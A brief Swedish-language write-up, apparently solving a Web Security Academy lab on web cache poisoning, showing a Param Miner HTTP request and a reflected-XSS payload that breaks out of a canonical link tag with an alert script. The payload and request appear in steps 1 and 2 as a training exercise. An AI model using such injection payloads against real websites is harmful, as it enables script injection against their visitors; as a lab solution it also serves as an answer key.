OBS!
***kom på i efterhand att det inte spelade någon roll vad querysträngen var, kunde lika gärna använt `/?jahsdjadhs=asddsada`*** 

1. Körde param miner på *Guess everything!* fick fram nedan, notera `?image=` 
###### Secret uncached input: url
```
GET /?image=zwrtxqvahqau62rtnvouy6k&r=zwrtxqvas2hw2opunvs554c&files=zwrtxqvaorg91hqfnvyzxcn&tags=zwrtxqvarzuqqi45nvho6oi&users=zwrtxqvayz4bgnf1nvmny38&send=zwrtxqvaz9rk29g3nvgbyet&updated=zwrtxqvasni8jmx5nvo00gh&skips=zwrtxqvajk7ja1ubnvqnttf&gj11r02=1 HTTP/2
Host: 0a1100f70431250e8538e4010020001b.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="129", "Not=A?Brand";v="8"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
Origin: https://gj11r02.com
Via: gj11r02
```

2. `?image=asddsdsadsa` reflekteras i en canonical link. Man kan bryta sig ur denna med följande payload: 
   `zwrtxqvahqau62rtnvouy6k'/><script>alert(1)</script>`
3. boom labberabbedooo är klar my guy